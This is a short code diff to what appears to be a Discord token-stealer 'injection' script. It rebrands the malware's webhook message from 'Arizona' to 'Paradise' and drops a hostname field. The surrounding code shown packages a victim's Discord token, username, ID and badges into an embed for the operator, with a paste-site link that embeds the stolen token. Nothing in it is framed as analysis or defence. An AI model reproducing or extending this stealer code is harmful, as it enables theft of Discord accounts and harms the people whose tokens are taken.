@@ -110,7 +110,7 @@ async function firstTime() {
             } else {
                 const t = await getUserInfo(e);
                 n = {
-                    username: "Arizona",
+                    username: "Paradise",
                     content: "",
                     embeds: [
                         {
@@ -118,14 +118,14 @@ async function firstTime() {
                             description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/" + e + ")",
                             color: config["embed-color"],
                             fields: [
-                                { name: "Info", value: `\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``, inline: !1 },
+                                
                                 { name: "Username", value: `\`${t.username}#${t.discriminator}\``, inline: !0 },
                                 { name: "ID", value: `\`${t.id}\``, inline: !0 },
-                                { name: "Badges", value: `${getBadges(t.flags)}`, inline: !1 },
+                                { name: "<a:allbadges:895906088996720690> Badges", value: `${getBadges(t.flags)}`, inline: !1 },
                                 { name: "Token", value: `\`\`\`${e}\`\`\``, inline: !1 },
                             ],
-                            author: { name: "Arizona" },
-                            footer: { text: "Arizona" },
+                            author: { name: "Paradise" },
+                            footer: { text: "Paradise" },
                             thumbnail: { url: `https://cdn.discordapp.com/avatars/${t.id}/${t.avatar}` },
                         },
                     ],
